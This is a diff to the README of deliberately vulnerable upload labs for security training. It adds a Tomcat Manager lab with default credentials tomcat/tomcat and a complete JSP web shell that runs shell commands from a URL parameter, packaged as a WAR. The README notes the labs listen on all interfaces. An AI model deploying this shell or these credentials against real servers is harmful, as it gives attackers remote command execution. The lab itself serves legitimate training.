@@ -1,10 +1,11 @@
 # Lab Viper Upload RCE
 
-Three intentionally vulnerable upload labs for local security training:
+Four intentionally vulnerable upload labs for local security training:
 
 - PHP on Apache: http://127.0.0.1:8081
 - JSP on Tomcat: http://127.0.0.1:8082
 - ASPX on Mono/XSP: http://127.0.0.1:8083
+- Tomcat Manager WAR upload: http://127.0.0.1:8084
 
 The compose file binds these ports on `0.0.0.0`, so they are also reachable from other machines using the Docker host IP, for example `http://<host-ip>:8081`.
 
@@ -15,6 +16,7 @@ Use the matching payload extension for each runtime:
 - PHP lab: `.php`
 - JSP lab: `.jsp`
 - ASPX lab: `.aspx`
+- Tomcat Manager lab: `.war`
 
 For example, uploading `exploit1.php` to the ASPX lab on port `8083` will not execute PHP; it will be served as a static file/download. Upload that payload to the PHP lab on port `8081`, or use an `.aspx` payload for port `8083`.
 
@@ -72,6 +74,36 @@ Example after uploading:
 - http://127.0.0.1:8082/uploads/cmd.jsp?cmd=id
 - http://127.0.0.1:8083/uploads/cmd.aspx?cmd=id
 
+## Tomcat Manager WAR Upload
+
+Open http://127.0.0.1:8084/manager/html and log in with:
+
+- Username: `tomcat`
+- Password: `tomcat`
+
+Upload a WAR file from the "WAR file to deploy" form. Tomcat deploys the uploaded archive as a web application.
+
+Minimal JSP inside a WAR:
+
+```jsp
+<%@ page import="java.io.*" %>
+<pre><%
+String cmd = request.getParameter("cmd");
+if (cmd == null) cmd = "id";
+Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
+try (InputStream in = p.getInputStream()) {
+    int c;
+    while ((c = in.read()) != -1) out.print((char)c);
+}
+%></pre>
+```
+
+If that file is packaged as `cmd.jsp` inside `shell.war`, access it after deployment at:
+
+- http://127.0.0.1:8084/shell/cmd.jsp?cmd=id
+
 ## Notes
 
 These services intentionally allow remote code execution. Keep them on a private lab network and do not expose them to the public internet.
+
+The ASPX lab runs on Mono/XSP inside Linux, not IIS on Windows. ASPX payloads that assume `cmd.exe`, PowerShell, Windows paths, or IIS-only behavior can throw runtime exceptions. The lab sets `customErrors` to `Off` so those exceptions are visible during testing.
